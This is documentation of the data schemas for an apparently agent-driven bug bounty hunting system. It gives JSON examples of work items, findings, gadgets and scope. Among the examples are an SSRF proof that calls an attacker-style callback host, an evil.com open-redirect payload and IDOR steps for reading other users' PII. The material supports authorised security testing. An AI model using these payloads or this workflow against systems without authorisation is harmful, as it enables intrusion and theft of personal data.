# Hunt Architecture Data Schemas

Canonical type definitions live in `src/shared/hunt-types.ts`. This document provides human-readable documentation with examples.

## WorkItem

The fundamental unit of work in the hunt loop. Every action (recon, test, exploit, validate, report) is a work item.

**File:** `hunt-state/queue.json` (array of WorkItems)

**Created by:** SEED phase, module results (new_work_items), intel module
**Read by:** Hunt loop (dequeue), intel module (analysis)

```json
{
  "id": "a1b2c3d4-5678-90ab-cdef-1234567890ab",
  "type": "test",
  "subtype": "ssrf-test",
  "target": "https://api.example.com/fetch?url=",
  "priority": 70,
  "status": "queued",
  "model_tier": "sonnet",
  "context": {
    "tech_stack": ["Node.js", "Express"],
    "parameters": ["url", "callback"],
    "parent_finding": "Reflected input in url parameter"
  },
  "parent_id": "f0e1d2c3-b4a5-6789-0123-456789abcdef",
  "children_ids": [],
  "created_at": "2026-02-25T10:30:00Z",
  "started_at": null,
  "completed_at": null,
  "result": null,
  "escalation_count": 0,
  "retry_count": 0,
  "tags": ["api", "high-value"]
}
```

## WorkItemResult

Returned by every worker agent after executing a work item.

**Created by:** Worker agents (recon, test, exploit, validate, report)
**Read by:** Hunt loop (processing), intel module (signal/gadget analysis)

```json
{
  "success": true,
  "summary": "Tested SSRF on /fetch endpoint - blind SSRF confirmed via DNS callback",
  "new_surfaces": [
    {
      "id": "s-001",
      "type": "endpoint",
      "url": "https://api.example.com/internal/admin",
      "method": "GET",
      "notes": "Discovered via SSRF - internal admin panel",
      "discovered_by": "a1b2c3d4-5678-90ab-cdef-1234567890ab",
      "discovered_at": "2026-02-25T10:35:00Z"
    }
  ],
  "signals": [
    {
      "id": "sig-001",
      "type": "ssrf-partial",
      "description": "DNS resolution confirmed but no HTTP response body returned",
      "target": "https://api.example.com/fetch?url=",
      "confidence": 0.7,
      "amplification_match": null,
      "source_work_item": "a1b2c3d4-5678-90ab-cdef-1234567890ab"
    }
  ],
  "findings": [],
  "gadgets": [
    {
      "id": "g-001",
      "type": "ssrf-partial",
      "description": "Blind SSRF via url parameter - DNS resolves but no response body",
      "target": "https://api.example.com/fetch?url=",
      "provides": ["ssrf-access", "internal-network"],
      "requires": [],
      "proof": "curl 'https://api.example.com/fetch?url=http://attacker.burpcollaborator.net' - DNS callback received",
      "discovered_by": "a1b2c3d4-5678-90ab-cdef-1234567890ab"
    }
  ],
  "new_work_items": [
    {
      "type": "test",
      "subtype": "blind-ssrf",
      "target": "https://api.example.com/fetch?url=",
      "priority": 70,
      "model_tier": "sonnet",
      "context": { "confirmed_dns": true, "parameter": "url" },
      "tags": ["ssrf", "chain-potential"]
    }
  ],
  "raw_output": "Full HTTP request/response logs...",
  "tokens_used": 2500,
  "duration_ms": 15000
}
```

## Surface

A discovered piece of attack surface — an endpoint, subdomain, service, or cloud asset.

**File:** `hunt-state/surfaces.json` (array of Surfaces)

**Created by:** Recon module (primarily), test module (when new endpoints discovered)
**Read by:** Intel module (coverage analysis), test module (target selection)

```json
{
  "id": "s-042",
  "type": "api_route",
  "url": "https://api.example.com/v2/users/{id}/profile",
  "method": "GET",
  "params": ["id"],
  "tech_stack": ["Node.js", "Express", "PostgreSQL"],
  "auth_required": true,
  "notes": "User profile endpoint - returns PII. Discovered via JS analysis.",
  "discovered_by": "js-analysis-work-item-id",
  "discovered_at": "2026-02-25T09:15:00Z"
}
```

## Signal

A weak observation worth investigating further. Not a confirmed vulnerability, but interesting behavior.

**File:** `hunt-state/signals.json` (array of Signals)

**Created by:** All modules
**Read by:** Intel module (amplification)

```json
{
  "id": "sig-015",
  "type": "reflected-input",
  "description": "Parameter 'search' value reflected in response body without encoding in <div> context",
  "target": "https://example.com/search?q=test",
  "confidence": 0.6,
  "amplification_match": null,
  "source_work_item": "owasp-quick-work-item-id"
}
```

## Finding

A confirmed or candidate vulnerability with PoC and evidence.

**File:** `hunt-state/findings.json` (array of Findings)

**Created by:** Test module (candidate), exploit module (confirmed), validate module (validated/rejected)
**Read by:** Validate module, report module, intel module (chain analysis)

```json
{
  "id": "f-003",
  "title": "IDOR in /api/v2/users/{id}/profile allows access to any user's PII",
  "vulnerability_type": "IDOR",
  "severity": "high",
  "confidence": 0.95,
  "target": "https://api.example.com/v2/users/{id}/profile",
  "proof_of_concept": "1. Authenticate as User A (id=123)\n2. GET /api/v2/users/456/profile with User A's token\n3. Response contains User B's email, phone, address",
  "impact": "Any authenticated user can read the PII of all other users by iterating user IDs. Affects ~500K users.",
  "cvss_score": 7.5,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
  "cwe_id": "CWE-639",
  "chain_ids": [],
  "status": "validated",
  "validation_gates": {
    "in_scope": true,
    "not_excluded": true,
    "not_duplicate": true,
    "proof_reproducible": true,
    "quality_sufficient": true
  },
  "evidence": ["evidence/f-003-request.txt", "evidence/f-003-response.txt"],
  "discovered_by": "idor-test-work-item-id",
  "discovered_at": "2026-02-25T11:00:00Z",
  "validated_at": "2026-02-25T11:30:00Z"
}
```

## Gadget

A reusable exploitation primitive. Even informational findings become gadgets for chaining.

**File:** `hunt-state/gadgets.json` (array of Gadgets)

**Created by:** All modules (any finding with chaining potential)
**Read by:** Intel module (chain analysis), exploit module (chain execution)

```json
{
  "id": "g-007",
  "type": "open-redirect",
  "description": "Open redirect via 'next' parameter on login page",
  "target": "https://example.com/login?next=https://evil.com",
  "provides": ["redirect-control"],
  "requires": [],
  "proof": "curl -v 'https://example.com/login?next=https://evil.com' -> 302 Location: https://evil.com",
  "discovered_by": "open-redirect-test-work-item-id"
}
```

## HuntState

Top-level container for the entire hunt. Metadata and references to all sub-files.

**File:** `hunt-state/hunt.json`

```json
{
  "hunt_id": "hunt-2026-02-25-abc123",
  "program": "example-security",
  "scope": {
    "in_scope": ["*.example.com", "api.example.com"],
    "out_of_scope": ["blog.example.com", "status.example.com"],
    "bounty_table": {
      "critical": { "min": 5000, "max": 25000 },
      "high": { "min": 2500, "max": 10000 },
      "medium": { "min": 500, "max": 2500 },
      "low": { "min": 100, "max": 500 }
    },
    "program_policy": "No DoS. Use test accounts only. Required header: X-Research: overtimedev",
    "exclusions": ["rate-limiting", "missing-csp", "self-xss"]
  },
  "started_at": "2026-02-25T08:00:00Z",
  "last_active": "2026-02-25T12:30:00Z",
  "status": "running",
  "queue": [],
  "findings": [],
  "surfaces": [],
  "gadgets": [],
  "signals": [],
  "coverage": {
    "endpoints_tested": {},
    "vuln_classes_covered": [],
    "vuln_classes_remaining": ["sqli", "xss", "ssrf", "idor", "auth-bypass"]
  },
  "intel_runs": 4,
  "stats": {
    "work_items_total": 47,
    "work_items_completed": 35,
    "work_items_failed": 3,
    "findings_total": 5,
    "findings_confirmed": 3,
    "tokens_total": 150000,
    "cost_estimate_usd": 2.85,
    "elapsed_minutes": 270
  }
}
```

## ValidationGates

Tracks which validation gates a finding has passed.

**Embedded in:** Finding.validation_gates

```json
{
  "in_scope": true,
  "not_excluded": true,
  "not_duplicate": true,
  "proof_reproducible": true,
  "quality_sufficient": null
}
```

`null` = not yet checked. `true` = passed. `false` = failed.

## CoverageTracker

Tracks which endpoints have been tested for which vulnerability classes.

**File:** `hunt-state/coverage.json`

```json
{
  "endpoints_tested": {
    "https://api.example.com/v2/users/{id}/profile": ["idor", "cors-misconfiguration", "auth-bypass"],
    "https://api.example.com/graphql": ["graphql-introspection", "graphql-batching"],
    "https://example.com/search": ["xss-reflected", "sqli", "open-redirect"]
  },
  "vuln_classes_covered": ["idor", "cors-misconfiguration", "graphql-introspection", "xss-reflected", "sqli"],
  "vuln_classes_remaining": ["ssrf", "csrf", "ssti", "deserialization", "cache-poisoning", "race-condition"]
}
```

## File Layout

```
hunt-state/
├── hunt.json             # Top-level HuntState
├── queue.json            # WorkItem[] priority queue
├── findings.json         # Finding[] all findings
├── surfaces.json         # Surface[] attack surface map
├── gadgets.json          # Gadget[] exploitation primitives
├── signals.json          # Signal[] weak signals
├── coverage.json         # CoverageTracker
├── intel-log.json        # Intel module run history
├── compaction-marker.json # Written by PreCompact hook
├── reports/              # Generated H1-ready reports
│   ├── finding-f-001.md
│   └── finding-f-003.md
└── evidence/             # Screenshots, HTTP logs
    ├── f-003-request.txt
    └── f-003-response.txt
```
